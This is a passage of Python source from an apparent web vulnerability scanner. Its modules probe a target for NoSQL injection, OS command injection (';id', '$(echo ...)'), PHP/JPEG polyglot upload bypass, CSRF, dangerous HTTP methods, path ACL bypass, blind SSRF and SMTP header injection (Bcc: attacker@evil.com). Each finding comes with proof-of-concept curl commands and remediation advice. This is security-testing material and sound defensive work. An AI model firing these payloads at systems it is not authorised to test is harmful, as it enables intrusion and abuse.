                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL."
            ))
        return profile

# ── TOOL 37: NOSQL INJECTION  (SKILL-47) ───────────────────
class NoSQLInjection:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("NOSQLI-37: NoSQL/MongoDB operator injection")
        base = profile.url.rstrip("/")
        payloads_json = [
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            '{"$where":"1==1"}', '{"$exists":true}',
        ]
        payloads_url = ["[$gt]=", "[$ne]=null", "[$regex]=.*", "[$exists]=true"]
        params = list(set(profile.parameters[:5] + ["username","email","password","id","search"]))
        confirmed = []
        for param in params[:8]:
            # JSON body injection
            for payload in payloads_json:
                try:
                    body_data = json.dumps({param: json.loads(payload)}).encode()
                except Exception:
                    continue
                code, body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=body_data,
                    headers_extra={"Content-Type":"application/json"})
                if code == 200 and len(body) > 20:
                    baseline_code, baseline_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                        method="POST", data=json.dumps({param: "invalid_xyz_123"}).encode(),
                        headers_extra={"Content-Type":"application/json"})
                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
                        high(f"  NoSQLi: param '{param}' payload '{payload}' changed response!")
                        confirmed.append({"param":param,"payload":payload})
            # URL param injection
            for suffix in payloads_url:
                test_url = f"{base}?{param}{suffix}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                if code == 200:
                    baseline_code, baseline_body, _ = _fetch(f"{base}?{param}=invalid_xyz", cfg.user_agent, cfg.timeout)
                    if len(body) != len(baseline_body) and abs(len(body)-len(baseline_body)) > 30:
                        warn(f"  NoSQLi URL: {test_url}")
                        confirmed.append({"param":param,"payload":suffix})
        if confirmed:
            profile.findings.append(Finding(
                id="F-NOSQL-001", title="NoSQL Injection (MongoDB Operators)",
                severity="CRITICAL", cwe="CWE-943", cvss=9.4,
                description=f"NoSQL operator injection in: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
                poc_curl=f"curl -sk -X POST '{base}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'",
                category="NoSQL Injection",
                remediation="Sanitize inputs. Use schema validation. Avoid $where. Use query builders."
            ))
        return profile

# ── TOOL 38: COMMAND INJECTION  (SKILL-48) ─────────────────
class CommandInjectionScanner:
    """Safe blind detection via timing (sleep 0 = no actual delay risk)."""
    CMD_PAYLOADS = [
        (";echo CMDINJTEST",  "CMDINJTEST"),
        ("&&echo CMDINJTEST", "CMDINJTEST"),
        ("|echo CMDINJTEST",  "CMDINJTEST"),
        ("`echo CMDINJTEST`", "CMDINJTEST"),
        ("$(echo CMDINJTEST)","CMDINJTEST"),
        (";id",               "uid="),
        ("&&id",              "uid="),
        ("|id",               "uid="),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CMDI-38: Command injection (echo/id-based reflection detection)")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["cmd","exec","run","command","ping","host","ip","query"]))
        confirmed = []
        for param in params[:10]:
            for payload, indicator in self.CMD_PAYLOADS:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if indicator in body:
                    high(f"  CMDI CONFIRMED: param '{param}' payload '{payload}' → '{indicator}' in response!")
                    confirmed.append({"param":param,"payload":payload,"url":url,"indicator":indicator})
                    break
                # POST
                pc, pb, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
                if indicator in pb:
                    high(f"  CMDI POST: '{param}' → '{indicator}'")
                    confirmed.append({"param":param,"payload":payload,"url":base,"indicator":indicator})
                    break
        if confirmed:
            profile.findings.append(Finding(
                id="F-CMDI-001", title="OS Command Injection",
                severity="CRITICAL", cwe="CWE-78", cvss=10.0,
                description=f"Command injection confirmed in params: {[c['param'] for c in confirmed]}",
                evidence="\n".join(f"{c['param']}: {c['payload']} → {c['indicator']}" for c in confirmed),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="Command Injection",
                remediation="Never pass user input to OS commands. Use allow-list validation. Use subprocess with args list."
            ))
        return profile

# ── TOOL 39: FILE UPLOAD SECURITY  (SKILL-49) ──────────────
class FileUploadTester:
    MALICIOUS_EXTENSIONS = [".php",".php5",".phtml",".phar",".asp",".aspx",".jsp",".jspx",".shtml"]
    POLYGLOT_JPEG_PHP = b'\xff\xd8\xff\xe0' + b'<?php echo "UPLOADTEST"; ?>'

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("UPLOAD-39: File upload security (extension bypass, content-type confusion)")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        # Find file upload forms
        upload_inputs = re.findall(r'<input[^>]*type=["\']file["\'][^>]*>', html_body, re.I)
        upload_forms  = re.findall(r'<form[^>]*(?:enctype=["\']multipart/form-data["\'])[^>]*action=["\']([^"\']+)["\']',
                                   html_body, re.I)
        if not upload_inputs and not upload_forms:
            # Check API paths
            for path in ["/api/upload","/upload","/api/file","/api/files","/api/media","/api/avatar","/api/attachment"]:
                code, body, hdrs = _fetch(profile.url.rstrip("/")+path, cfg.user_agent, cfg.timeout,
                                          method="POST",
                                          data=b'--boundary\r\nContent-Disposition: form-data; name="file"; filename="test.txt"\r\nContent-Type: text/plain\r\n\r\ntest\r\n--boundary--',
                                          headers_extra={"Content-Type":"multipart/form-data; boundary=boundary"})
                if code in [200,201,400,413,415,422]:
                    warn(f"  Upload endpoint: {path} [{code}]")
                    upload_forms.append(path)
            if not upload_forms:
                info("  No file upload endpoints found"); return profile

        upload_findings = []
        for action in (upload_forms[:3] or [profile.url]):
            url = action if action.startswith("http") else profile.url.rstrip("/")+action
            # Test 1: PHP disguised as image (polyglot)
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            for ext in [".php.jpg",".php%00.jpg",".phtml",".php5"]:
                body_mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
                           f"filename=\"test{ext}\"\r\nContent-Type: image/jpeg\r\n\r\n").encode()
                body_mp += self.POLYGLOT_JPEG_PHP + f"\r\n--{boundary}--\r\n".encode()
                code, resp, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                    method="POST", data=body_mp,
                    headers_extra={"Content-Type": f"multipart/form-data; boundary={boundary}"})
                if code in [200,201]:
                    # Check if file URL returned
                    file_url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(ext.split("%")[0]), resp)
                    if file_url_match or "success" in resp.lower() or "url" in resp.lower():
                        high(f"  FILE UPLOAD BYPASS: ext '{ext}' accepted at {url}")
                        upload_findings.append({"ext":ext,"url":url})
        if upload_findings:
            profile.findings.append(Finding(
                id="F-UPLOAD-001", title="File Upload Security Bypass",
                severity="CRITICAL", cwe="CWE-434", cvss=9.8,
                description=f"Malicious file extensions accepted: {[u['ext'] for u in upload_findings]}",
                evidence="\n".join(f"{u['ext']} → {u['url']}" for u in upload_findings),
                reproduction=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
                poc_curl=f"curl -sk -X POST '{upload_findings[0]['url']}' -F 'file=@shell.php;filename=shell.php.jpg;type=image/jpeg'",
                category="File Upload",
                remediation="Validate file content by magic bytes, not extension. Store outside webroot. Use a CDN with execution disabled."
            ))
        else:
            info(f"  Upload endpoints found but no obvious bypass detected (manual test recommended)")
        return profile

# ── TOOL 40: CSRF BYPASS DETECTOR  (SKILL-50) ──────────────
class CSRFDetector:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CSRF-40: CSRF token bypass detection")
        base = profile.url.rstrip("/")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        forms = re.findall(
            r'<form[^>]*method=["\']post["\'][^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S)
        issues = []
        for action, form_html in forms[:5]:
            action_url = action if action.startswith("http") else base + action
            has_csrf = bool(re.search(r'name=["\'](?:csrf|_token|authenticity_token|__RequestVerificationToken)["\']', form_html, re.I))
            has_samesite = any(c.get("issues") and "missing SameSite" not in str(c["issues"]) for c in profile.cookie_results)
            if not has_csrf:
                warn(f"  CSRF: POST form missing token — {action_url}")
                issues.append({"action": action_url, "issue": "missing_csrf_token"})
            else:
                # Try sending without token
                inputs = re.findall(r'name=["\']([^"\']+)["\'].*?value=["\']([^"\']*)["\']', form_html, re.I)
                data = {k: v for k, v in inputs if "csrf" not in k.lower() and "token" not in k.lower()}
                code, body, _ = _fetch(action_url, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode(data).encode(),
                    headers_extra={"Content-Type":"application/x-www-form-urlencoded",
                                   "Origin":"https://attacker.com", "Referer":"https://attacker.com/"})
                if code in [200, 201, 302]:
                    warn(f"  CSRF: form action may accept request without valid CSRF token!")
                    issues.append({"action": action_url, "issue": "token_not_validated"})
        if issues:
            profile.findings.append(Finding(
                id="F-CSRF-001", title="CSRF Protection Bypass",
                severity="HIGH", cwe="CWE-352", cvss=8.1,
                description=f"CSRF issues on {len(issues)} form(s).",
                evidence="\n".join(f"{i['action']}: {i['issue']}" for i in issues),
                reproduction="# Craft HTML form pointing to action URL and auto-submit from attacker.com",
                poc_curl=f"curl -sk -X POST '{issues[0]['action']}' -H 'Origin: https://attacker.com' -d 'param=value'",
                category="CSRF",
                remediation="Use SameSite=Strict cookies. Validate CSRF tokens server-side. Use double-submit cookie pattern."
            ))
        return profile

# ── TOOL 41: CLICKJACKING TESTER  (SKILL-51) ───────────────
class ClickjackingTester:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CJACK-41: Clickjacking via X-Frame-Options + CSP frame-ancestors")
        _, _, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        xfo = hdrs.get("x-frame-options","").upper()
        csp = hdrs.get("content-security-policy","").lower()
        has_frame_ancestors = "frame-ancestors" in csp
        has_xfo = xfo in ["DENY","SAMEORIGIN"]
        if not has_xfo and not has_frame_ancestors:
            high(f"  CLICKJACKING: No X-Frame-Options or CSP frame-ancestors — page embeddable!")
            profile.findings.append(Finding(
                id="F-CJ-001", title="Clickjacking Vulnerability",
                severity="MEDIUM", cwe="CWE-1021", cvss=5.4,
                description="Page can be embedded in an iframe — clickjacking possible.",
                evidence=f"X-Frame-Options: '{xfo}' | CSP frame-ancestors: {has_frame_ancestors}",
                reproduction=(
                    "<html><body>"
                    f"<iframe src='{profile.url}' width='800' height='600'></iframe>"
                    "</body></html>"
                ),
                poc_curl=f"curl -sI '{profile.url}' | grep -i 'x-frame\\|frame-ancestors'",
                category="Clickjacking",
                remediation="Set X-Frame-Options: DENY or CSP frame-ancestors 'self'."
            ))
        elif xfo == "SAMEORIGIN" and not has_frame_ancestors:
            warn(f"  CLICKJACKING: X-Frame-Options=SAMEORIGIN (CSP preferred, SAMEORIGIN acceptable)")
        else:
            ok(f"  Clickjacking protected: XFO={xfo} | frame-ancestors={has_frame_ancestors}")
        return profile

# ── TOOL 42: HTTP METHOD TAMPERING  (SKILL-52) ─────────────
class HTTPMethodTampering:
    INTERESTING = ["TRACE","TRACK","PUT","DELETE","PATCH","OPTIONS","CONNECT","DEBUG","MOVE","COPY"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("METHOD-42: HTTP method tampering + TRACE/WebDAV detection")
        vulns = []
        for method in self.INTERESTING:
            code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout, method=method)
            allow = hdrs.get("allow","")
            if method == "TRACE" and (code == 200 or "TRACE" in body.upper()):
                high(f"  TRACE ENABLED — XST (Cross-Site Tracing) risk!")
                vulns.append({"method":"TRACE","code":code,"risk":"XST"})
            elif method == "PUT" and code in [200,201,204]:
                high(f"  PUT METHOD ALLOWED: {code} — arbitrary file write possible!")
                vulns.append({"method":"PUT","code":code,"risk":"file_write"})
            elif method == "DELETE" and code in [200,204]:
                high(f"  DELETE METHOD ALLOWED: {code}")
                vulns.append({"method":"DELETE","code":code,"risk":"file_delete"})
            elif method == "OPTIONS" and allow:
                ok(f"  OPTIONS: Allow: {allow}")
                if re.search(r'\b(PUT|DELETE|TRACE|CONNECT)\b', allow):
                    warn(f"  Dangerous methods in Allow header: {allow}")
                    vulns.append({"method":"OPTIONS","code":code,"risk":f"dangerous_allow:{allow}"})
            # X-HTTP-Method-Override tunnel
            if method in ["DELETE","PUT"]:
                code2, body2, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                    method="POST",
                    headers_extra={"X-HTTP-Method-Override": method, "X-Method-Override": method})
                if code2 in [200,201,204]:
                    warn(f"  METHOD OVERRIDE: POST+X-HTTP-Method-Override:{method} → {code2}")
                    vulns.append({"method":f"POST→{method}","code":code2,"risk":"method_override"})
        if vulns:
            dangerous = [v for v in vulns if v["risk"] in ["XST","file_write","file_delete"]]
            profile.findings.append(Finding(
                id="F-METHOD-001", title="Dangerous HTTP Methods Enabled",
                severity="HIGH" if dangerous else "MEDIUM",
                cwe="CWE-749", cvss=7.5 if dangerous else 5.3,
                description=f"Dangerous HTTP methods: {[v['method'] for v in vulns]}",
                evidence="\n".join(f"{v['method']}: HTTP {v['code']} ({v['risk']})" for v in vulns),
                reproduction="\n".join(f"curl -sk -X {v['method']} '{profile.url}'" for v in vulns[:3]),
                poc_curl=f"curl -sk -X TRACE '{profile.url}'",
                category="HTTP Methods",
                remediation="Disable unused HTTP methods at web server level. Block TRACE/TRACK globally."
            ))
        return profile

# ── TOOL 43: ACCOUNT ENUMERATION (TIMING)  (SKILL-53) ──────
class AccountEnumerationTiming:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ENUM-43: Account enumeration via login/register response timing")
        base = profile.url.rstrip("/")
        login_paths = ["/api/login","/login","/api/auth/login","/auth/login","/api/v1/auth"]
        register_paths = ["/api/register","/register","/api/signup","/signup","/api/users"]
        for path in login_paths[:3]:
            url = base + path
            # Test with likely-existing email vs random
            times = {"known":[], "unknown":[]}
            for email, key in [("admin@example.com","known"),("nonexistent_xyz_123@notreal.invalid","unknown")]:
                for _ in range(3):
                    t0 = time.time()
                    _fetch(url, cfg.user_agent, 5, method="POST",
                           data=json.dumps({"email":email,"password":"wrongpassword"}).encode(),
                           headers_extra={"Content-Type":"application/json"})
                    times[key].append(time.time()-t0)
                    time.sleep(0.1)
            avg_known   = sum(times["known"])   / len(times["known"])
            avg_unknown = sum(times["unknown"]) / len(times["unknown"])
            diff = abs(avg_known - avg_unknown)
            if diff > 0.1:
                warn(f"  TIMING DIFF on {path}: known={avg_known:.3f}s unknown={avg_unknown:.3f}s (diff={diff:.3f}s)")
                if diff > 0.3:
                    profile.findings.append(Finding(
                        id=f"F-ENUM-{len(profile.findings):03d}",
                        title="Account Enumeration via Response Timing",
                        severity="MEDIUM", cwe="CWE-203", cvss=5.3,
                        description=f"Login at {path} leaks user existence via timing: {diff:.3f}s difference.",
                        evidence=f"Known: {avg_known:.3f}s | Unknown: {avg_unknown:.3f}s | Diff: {diff:.3f}s",
                        reproduction=f"# Time 10 requests with admin@target.com vs random@random.invalid at {url}",
                        poc_curl=f"time curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"email\":\"admin@{profile.host}\",\"password\":\"x\"}}'",
                        category="Account Enumeration",
                        remediation="Use constant-time comparison. Return identical responses for valid/invalid users."
                    ))
        return profile

# ── TOOL 44: PATH-BASED ACL BYPASS  (SKILL-54) ─────────────
class PathACLBypass:
    TRAVERSALS = [
        "/admin/../user", "/admin/%2e%2e/user", "/admin/./user",
        "/admin%2fadmin", "/ADMIN", "/Admin",
        "/api/admin/../public", "/api/v1/admin%2f..%2fpublic",
        "//admin", "/./admin", "/%61dmin",  # URL encoding of 'a'
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("ACLBYP-44: Path-based ACL bypass (traversal, case, encoding)")
        base = profile.url.rstrip("/")
        found = []
        # Baseline: what does /admin return normally?
        admin_code, _, _ = _fetch(base+"/admin", cfg.user_agent, cfg.timeout)
        if admin_code not in [401,403]:
            info(f"  /admin returns {admin_code} — no baseline restriction to bypass")
            return profile
        for traversal in self.TRAVERSALS:
            code, body, _ = _fetch(base+traversal, cfg.user_agent, cfg.timeout)
            if code == 200:
                high(f"  ACL BYPASS: {traversal} → HTTP {code} (baseline /admin = {admin_code})")
                found.append({"path":traversal,"code":code})
        if found:
            profile.findings.append(Finding(
                id="F-ACL-001", title="Path-Based Access Control Bypass",
                severity="HIGH", cwe="CWE-22", cvss=8.6,
                description=f"ACL bypass via path manipulation: {[f['path'] for f in found]}",
                evidence=f"Baseline /admin: HTTP {admin_code}\n" + "\n".join(f"{f['path']}: HTTP {f['code']}" for f in found),
                reproduction="\n".join(f"curl -sk '{base+f['path']}'" for f in found[:3]),
                poc_curl=f"curl -sk '{base+found[0]['path']}'",
                category="Access Control",
                remediation="Normalize URL paths before authorization checks. Use path canonicalization."
            ))
        return profile

# ── TOOL 45: API VERSION DOWNGRADE  (SKILL-55) ─────────────
class APIVersionDowngrade:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("APIDOWN-45: API version downgrade privilege regression")
        base = profile.url.rstrip("/")
        vuln_paths = []
        # Find highest API version available
        versions = []
        for v in ["/api/v1","/api/v2","/api/v3","/v1","/v2","/v3"]:
            code, _, _ = _fetch(base+v, cfg.user_agent, cfg.timeout)
            if code in [200,401,403]: versions.append((v,code))
        if len(versions) < 2:
            info("  Only one API version found — no downgrade test possible")
            return profile
        # Compare response structure between versions on same endpoints
        for endpoint in ["/users","/user","/profile","/account","/admin"]:
            codes = {}
            for v, _ in versions:
                url = base+v+endpoint
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                codes[v] = (code, len(body))
            code_set = set(c for c,_ in codes.values())
            if len(code_set) > 1:
                sorted_codes = sorted(codes.items(), key=lambda x: x[0])
                warn(f"  VERSION DIFF on {endpoint}: " + " | ".join(f"{v}: HTTP {c}" for v,(c,s) in sorted_codes))
                # If newer version is restricted (401/403) but older returns 200
                v_codes = {v:c for v,(c,s) in codes.items()}
                newer = [v for v in ["/api/v3","/v3","/api/v2","/v2"] if v in v_codes and v_codes[v] in [401,403]]
                older = [v for v in ["/api/v1","/v1"] if v in v_codes and v_codes[v] == 200]
                if newer and older:
                    high(f"  API DOWNGRADE: {older[0]+endpoint} returns 200 but {newer[0]+endpoint} is {v_codes[newer[0]]}")
                    vuln_paths.append({"endpoint":endpoint,"old":older[0],"new":newer[0],"diff":v_codes})
        if vuln_paths:
            profile.findings.append(Finding(
                id="F-APIDOWN-001", title="API Version Downgrade — Security Regression",
                severity="HIGH", cwe="CWE-1059", cvss=7.5,
                description=f"Older API versions expose endpoints restricted in newer versions.",
                evidence="\n".join(f"{v['endpoint']}: {v['old']}=200 vs {v['new']}=403" for v in vuln_paths),
                reproduction="\n".join(f"curl -sk '{base+v['old']+v['endpoint']}'" for v in vuln_paths[:2]),
                poc_curl=f"curl -sk '{base+vuln_paths[0]['old']+vuln_paths[0]['endpoint']}'",
                category="API Security",
                remediation="Apply identical authorization checks across all API versions. Deprecate and remove old versions."
            ))
        return profile

# ── TOOL 46: TLS MISCONFIGURATION SCANNER  (SKILL-56) ──────
class TLSMisconfigScanner:
    WEAK_CIPHERS = ["RC4","DES","3DES","EXPORT","NULL","ANON","aNULL","eNULL","SEED","MD5"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TLS-46: TLS version + weak cipher + old protocol detection")
        host = profile.host; issues = []
        # Check TLS 1.0 and 1.1 support
        for proto, ver_const in [("TLSv1.0", ssl.TLSVersion.TLSv1), ("TLSv1.1", ssl.TLSVersion.TLSv1_1)]:
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ver_const; ctx.maximum_version = ver_const
                with socket.create_connection((host,443),timeout=6) as s:
                    with ctx.wrap_socket(s, server_hostname=host) as ss:
                        high(f"  TLS WEAK PROTOCOL: {proto} accepted!")
                        issues.append(f"{proto} supported")
            except (ssl.SSLError, AttributeError, OSError):
                ok(f"  {proto}: rejected (good)")
        # Check current cipher suite
        cipher = profile.tls_cipher.upper()
        for weak in self.WEAK_CIPHERS:
            if weak in cipher:
                high(f"  WEAK CIPHER: {cipher} contains {weak}")
                issues.append(f"weak_cipher:{cipher}")
        # Check TLS version
        tls = profile.tls_version
        if tls in ["TLSv1","TLSv1.1"]:
            high(f"  DEPRECATED TLS: {tls}")
            issues.append(f"deprecated_tls:{tls}")
        elif tls in ["TLSv1.2"]:
            warn(f"  TLS 1.2 (prefer 1.3)")
        elif tls == "TLSv1.3":
            ok(f"  TLS 1.3 — current best practice")
        if issues:
            profile.findings.append(Finding(
                id="F-TLS-001", title="TLS Misconfiguration",
                severity="HIGH" if any("TLSv1.0" in i or "TLSv1.1" in i for i in issues) else "MEDIUM",
                cwe="CWE-326", cvss=7.4,
                description=f"TLS issues: {issues}",
                evidence=f"Issues: {issues}\nCurrent TLS: {tls} | Cipher: {cipher}",
                reproduction=f"openssl s_client -connect {host}:443 -tls1",
                poc_curl=f"curl -sk --tls-max 1.1 '{profile.url}'",
                category="TLS",
                remediation="Disable TLS 1.0/1.1. Configure only TLS 1.2+ with strong ciphers (AES-GCM, ChaCha20)."
            ))
        return profile

# ── TOOL 47: DNS ZONE TRANSFER  (SKILL-57) ─────────────────
class DNSZoneTransfer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("AXFR-47: DNS zone transfer (AXFR) attempt")
        apex = profile.apex
        import subprocess
        # Get NS records first
        ns_servers = []
        try:
            result = subprocess.run(["dig","+short","NS",apex], capture_output=True, text=True, timeout=8)
            ns_servers = [line.strip() for line in result.stdout.splitlines() if line.strip()]
        except Exception:
            # Fallback: try common NS patterns
            ns_servers = [f"ns1.{apex}", f"ns2.{apex}"]
        for ns in ns_servers[:3]:
            ns_clean = ns.rstrip(".")
            try:
                result = subprocess.run(
                    ["dig", "+noall", "+answer", f"@{ns_clean}", "AXFR", apex],
                    capture_output=True, text=True, timeout=10)
                output = result.stdout
                if output and len(output) > 100 and re.search(r'\s+IN\s+', output):
                    high(f"  ZONE TRANSFER ALLOWED via {ns_clean}!")
                    records = [l for l in output.splitlines() if l.strip() and not l.startswith(";")]
                    profile.findings.append(Finding(
                        id="F-AXFR-001", title="DNS Zone Transfer (AXFR) Allowed",
                        severity="HIGH", cwe="CWE-200", cvss=7.5,
                        description=f"DNS zone transfer allowed from {ns_clean} — full zone exposed.",
                        evidence="\n".join(records[:20]),
                        reproduction=f"dig @{ns_clean} AXFR {apex}",
                        poc_curl=f"dig @{ns_clean} AXFR {apex}",
                        category="DNS",
                        remediation="Restrict AXFR to authorized secondary DNS servers only."
                    ))
                else:
                    ok(f"  AXFR refused by {ns_clean} (good)")
            except Exception as e:
                info(f"  AXFR test failed for {ns_clean}: {e}")
        return profile

# ── TOOL 48: INSECURE DESERIALIZATION  (SKILL-58) ──────────
class DeserializationDetector:
    JAVA_MAGIC  = b'\xac\xed\x00\x05'
    PHP_PAT     = re.compile(r'O:\d+:"[^"]+":')
    PYTHON_PAT  = re.compile(r'(?:cos\n|cposix\n|cpickle\n)', re.S)
    JWT_NONE_PAT= re.compile(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.\s*$')

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("DESER-48: Insecure deserialization detection")
        issues = []
        for src_url in [profile.url] + profile.js_files[:5]:
            _, body, _ = _fetch(src_url, cfg.user_agent, cfg.timeout)
            if not body: continue
            # PHP serialized objects
            if self.PHP_PAT.search(body):
                warn(f"  PHP serialized object pattern in {src_url}")
                issues.append({"type":"php_serialize","url":src_url})
            # Base64-encoded Java serialization magic
            for m in re.finditer(r'[A-Za-z0-9+/]{20,}={0,2}', body):
                try:
                    dec = base64.b64decode(m.group(0))
                    if dec.startswith(self.JAVA_MAGIC):
                        high(f"  JAVA SERIALIZED OBJECT (base64) in {src_url}")
                        issues.append({"type":"java_serialize","url":src_url,"b64":m.group(0)[:40]})
                except Exception: pass
            # ViewState (ASP.NET) — check if MAC validation disabled
            vs = re.search(r'id=["\']__VIEWSTATE["\'][^>]*value=["\']([^"\']+)["\']', body)
            if vs:
                vs_val = vs.group(1)
                try:
                    decoded = base64.b64decode(vs_val + "==")
                    # If no MAC suffix (16 bytes), MAC validation might be off
                    if len(decoded) < 20 or not decoded[-20:]:
                        warn("  ViewState without MAC — deserialization exploit possible")
                        issues.append({"type":"viewstate_no_mac","url":src_url})
                except Exception: pass
        if issues:
            profile.findings.append(Finding(
                id="F-DESER-001", title="Insecure Deserialization Indicators",
                severity="HIGH", cwe="CWE-502", cvss=8.1,
                description=f"Serialized objects found: {[i['type'] for i in issues]}",
                evidence="\n".join(f"{i['type']}: {i['url']}" for i in issues[:5]),
                reproduction="# Test with ysoserial (Java) or phpggc (PHP) gadget chains",
                poc_curl=f"# Manual: send crafted serialized payload to {profile.url}",
                category="Deserialization",
                remediation="Avoid deserializing untrusted data. Use HMAC to sign serialized state. Use JSON instead."
            ))
        return profile

# ── TOOL 49: BLIND SSRF OOB PAYLOAD GENERATOR  (SKILL-59) ──
class BlindSSRFGenerator:
    """Generates OOB SSRF payloads using DNS-based detection patterns."""
    SSRF_PARAMS = ["url","fetch","src","href","link","endpoint","webhook","image_url",
                   "img_url","proxy","resource","target","dest","redirect","callback","feed"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BLIND-SSRF-49: OOB SSRF payload generation for manual verification")
        base = profile.url.rstrip("/")
        # Generate interaction URL placeholders (for Burp Collaborator / interactsh)
        host = profile.host
        oob_domain = f"YOUR_OOB_DOMAIN.burpcollaborator.net"
        payloads_generated = []
        # Probe params from JS/Wayback
        for param in list(set(profile.ssrf_params + self.SSRF_PARAMS))[:10]:
            oob_url = f"http://{param}.{host}.{oob_domain}/"
            test_url = f"{base}?{param}={urllib.parse.quote(oob_url)}"
            payloads_generated.append({"param":param,"payload":oob_url,"test_url":test_url})
        # Also probe all discovered API endpoints
        for endpoint in profile.api_endpoints[:10]:
            ep_url = base + endpoint if endpoint.startswith("/") else endpoint
            for param in self.SSRF_PARAMS[:5]:
                full = f"{ep_url}?{param}=http://{param}.oob.{oob_domain}/"
                payloads_generated.append({"param":param,"payload":full,"test_url":full})
        if payloads_generated:
            poc_lines = "\n".join(f"curl -sk '{p['test_url']}'" for p in payloads_generated[:10])
            profile.findings.append(Finding(
                id="F-BSSRF-001", title="Blind SSRF Attack Surface — OOB Payloads Generated",
                severity="INFO", cwe="CWE-918", cvss=0.0,
                description=f"Generated {len(payloads_generated)} OOB SSRF payloads for manual verification.",
                evidence="\n".join(f"{p['param']}: {p['test_url'][:80]}" for p in payloads_generated[:10]),
                reproduction=f"# Replace {oob_domain} with your Burp Collaborator/interactsh domain:\n{poc_lines}",
                poc_curl=f"curl -sk '{payloads_generated[0]['test_url']}'",
                category="SSRF",
                remediation="Use Burp Collaborator or https://app.interactsh.com to detect DNS callbacks."
            ))
        return profile

# ── TOOL 50: EMAIL/SMTP HEADER INJECTION  (SKILL-60) ───────
class EmailHeaderInjection:
    INJECT_PAYLOADS = [
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com\nBcc: attacker@evil.com",
        "test%0aBcc:attacker@evil.com",
        "test%0d%0aBcc:attacker@evil.com",
        "test@test.com\r\nContent-Type: text/html\r\n<script>alert(1)</script>",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("EMAIL-50: SMTP header injection via contact/feedback forms")
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        email_forms = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S)
        email_endpoints = ["/contact","/feedback","/support/new","/api/contact",
                           "/api/feedback","/help/new","/api/email","/subscribe"]
        confirmed = []
        for path in email_endpoints[:5]:
            url = profile.url.rstrip("/") + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                method="POST",
                data=urllib.parse.urlencode({
                    "email": self.INJECT_PAYLOADS[0],
                    "name": "Test", "message": "Test", "subject": "Test"
                }).encode(),
                headers_extra={"Content-Type":"application/x-www-form-urlencoded"})
            if code in [200,201,202] and re.search(r'sent|success|thank|received', body, re.I):
                high(f"  EMAIL INJECTION candidate at {path} — email accepted with CRLF payload!")
                confirmed.append({"path":path,"url":url})
        if confirmed:
            profile.findings.append(Finding(
                id="F-EMAIL-001", title="Email/SMTP Header Injection",
                severity="MEDIUM", cwe="CWE-93", cvss=5.3,
                description=f"Email header injection possible at {[c['path'] for c in confirmed]}",
                evidence="\n".join(f"{c['url']}: accepted CRLF in email field" for c in confirmed),
                reproduction="\n".join(
                    f"curl -sk -X POST '{c['url']}' -d 'email=test%40test.com%0aBcc%3Aattacker%40evil.com&message=test'"
                    for c in confirmed[:2]),
